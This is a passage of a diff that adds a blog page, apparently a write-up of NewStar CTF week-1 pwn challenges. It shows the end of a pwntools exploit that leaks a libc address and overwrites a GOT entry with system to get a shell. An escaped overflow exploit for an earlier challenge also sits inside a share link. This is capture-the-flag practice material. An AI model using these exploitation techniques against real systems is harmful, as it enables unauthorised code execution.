+info<span class="token punctuation">(</span><span class="token string">"PUTS_ADDR == %s "</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>puts
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system
+
+info<span class="token punctuation">(</span><span class="token string">"libc == %s"</span> <span class="token operator">%</span>libc<span class="token punctuation">)</span>
+info<span class="token punctuation">(</span><span class="token string">"libc_base == %s"</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+info<span class="token punctuation">(</span><span class="token string">"system_addr == %s"</span> <span class="token operator">%</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"now input your content:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="PWN5-Reference"><a href="#PWN5-Reference" class="headerlink" title="PWN5 Reference"></a>PWN5 Reference</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangbaohui/article/details/122547009">https://blog.csdn.net/xiangbaohui/article/details/122547009</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52126646/article/details/119494939">https://blog.csdn.net/qq_52126646&#x2F;article&#x2F;details&#x2F;119494939</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN1"><span class="toc-number">1.</span> <span class="toc-text">PWN1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN2-calc"><span class="toc-number">2.</span> <span class="toc-text">PWN2 calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN3-ret2libc"><span class="toc-number">3.</span> <span class="toc-text">PWN3 ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN4-ret2shellcode"><span class="toc-number">4.</span> <span class="toc-text">PWN4 ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN5"><span class="toc-number">5.</span> <span class="toc-text">PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN5-Reference"><span class="toc-number">5.1.</span> <span class="toc-text">PWN5 Reference</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/NEW_STAR%20Week1.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/NEW_STAR%20Week1.html&text=NEW_STAR-WEEK1-PWN"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/NEW_STAR%20Week1.html&is_video=false&description=NEW_STAR-WEEK1-PWN"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NEW_STAR-WEEK1-PWN&body=Check out this article: http://kelpie.top/post/NEW_STAR%20Week1.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/NEW_STAR%20Week1.html&title=NEW_STAR-WEEK1-PWN"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/NEW_STAR%20Week1.html&name=NEW_STAR-WEEK1-PWN&description=&lt;h2 id=&#34;PWN1&#34;&gt;&lt;a href=&#34;#PWN1&#34; class=&#34;headerlink&#34; title=&#34;PWN1&#34;&gt;&lt;/a&gt;PWN1&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
+
+context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;# io = process(&#39;./pwn&#39;)&lt;/span&gt;
+io &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4j.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;29139&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+offset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;
+padding &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt;
+
+vuln_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x400708&lt;/span&gt;
+pop_rdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x4007d3&lt;/span&gt;
+
+&lt;span class=&#34;token comment&#34;&gt;# basic overflow&lt;/span&gt;
+payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; padding&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;offset  &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vuln_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;?\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/NEW_STAR%20Week1.html&t=NEW_STAR-WEEK1-PWN"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
